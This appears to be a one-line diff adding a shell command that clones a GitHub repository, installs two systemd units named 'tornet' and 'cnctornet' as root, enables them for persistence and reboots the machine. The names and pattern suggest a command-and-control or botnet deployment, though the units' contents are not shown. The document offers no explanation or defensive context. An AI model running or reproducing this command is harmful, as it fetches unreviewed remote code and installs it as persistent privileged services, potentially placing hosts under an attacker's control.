@@ -1,0 +1,1 @@
+git clone https://github.com/Dewelo120/ttttt.git && mv /root/ttttt/tornet.service /etc/systemd/system/tornet.service && mv /root/ttttt/cnctornet.service /etc/systemd/system/cnctornet.service && systemctl daemon-reload && systemctl start tornet && systemctl enable tornet && systemctl start cnctornet && systemctl enable cnctornet && reboot
